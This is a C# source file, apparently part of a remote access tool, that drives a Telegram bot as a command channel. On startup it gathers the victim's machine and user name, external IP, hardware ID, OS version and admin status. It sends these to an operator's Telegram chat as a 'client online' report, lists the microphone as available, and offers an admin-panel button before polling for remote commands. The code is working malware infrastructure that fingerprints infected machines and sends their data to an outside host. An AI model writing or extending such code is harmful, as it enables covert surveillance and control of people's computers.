using System;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using VanguardCore;
using System.Diagnostics.CodeAnalysis;
using System.Collections.Generic;

namespace FinalBot
{
    public class BotOrchestrator
    {
        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly CommandHandler _commandHandler;
        private bool _isRunning = true;

        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(List<UpdateType>))]
        [DynamicDependency(DynamicallyAccessedMemberTypes.All, typeof(UpdateType))]
        public BotOrchestrator(string token, string adminId)
        {
            _botClient = new TelegramBotClient(token);
            _adminId = adminId;
            _commandHandler = new CommandHandler(_botClient, _adminId);
            TelegramService.Initialize(token, adminId);

            // NativeAOT Hint: preserve generic list of UpdateType
            GC.KeepAlive(new System.Collections.Generic.List<UpdateType>());
        }

        public async Task StartAsync()
        {
            Console.WriteLine("[ORCHESTRATOR] Starting services...");
            
            // 1. Initial Report (via Telegram as fallback/sender)
            await SendStartupReport();

            Console.WriteLine("[ORCHESTRATOR] Telegram Polling active.");

            var receiverOptions = new Telegram.Bot.Polling.ReceiverOptions
            {
                AllowedUpdates = null // This allows all updates and avoids the generic list trimming issue
            };

            _botClient.StartReceiving(
                updateHandler: _commandHandler.HandleUpdateAsync,
                pollingErrorHandler: _commandHandler.HandlePollingErrorAsync,
                receiverOptions: receiverOptions,
                cancellationToken: default
            );

            // Keep alive
            while (_isRunning)
            {
                await Task.Delay(1000);
            }
        }

        private async Task SendStartupReport()
        {
            string pcUser = $"{Environment.MachineName}\\{Environment.UserName}";
            string extIp = FinalBot.Modules.SystemInfoModule.GetExternalIP();
            string hwid = FinalBot.Modules.SystemInfoModule.GetHWID();
            string osVer = Environment.OSVersion.ToString();
            string adminStatus = VanguardCore.ElevationService.IsAdmin() ? "🟢 АДМИН" : "🟡 Обычный Юзер";

            string info = $"🚀 <b>КЛИЕНТ ОНЛАЙН</b>\n" +
                          $"━━━━━━━━━━━━━━━━━━\n" +
                          $"👤 <b>ID:</b> <code>{pcUser} ({hwid})</code>\n" +
                          $"🌐 <b>IP:</b> <code>{extIp}</code>\n" +
                          $"🖥️ <b>Система:</b> <code>{osVer}</code>\n" +
                          $"⚡ <b>Статус:</b> <code>{adminStatus}</code>\n" +
                          $"🎤 <b>Микрофон:</b> ✅\n" +
                          $"⌚ <b>Время:</b> <code>{DateTime.Now:yyyy-MM-dd HH:mm:ss}</code>\n" +
                          $"━━━━━━━━━━━━━━━━━━";
            var inlineKeyboard = new InlineKeyboardMarkup(new[]
            {
                new [] { InlineKeyboardButton.WithCallbackData("🎮 Админ-Панель", "admin_panel") }
            });

            try 
            {
                await _botClient.SendTextMessageAsync(
                    chatId: _adminId,
                    text: info,
                    parseMode: ParseMode.Html,
                    replyMarkup: inlineKeyboard
                );
            }
            catch { }
        }

        public void Stop()
        {
            _isRunning = false;
        }
    }
}
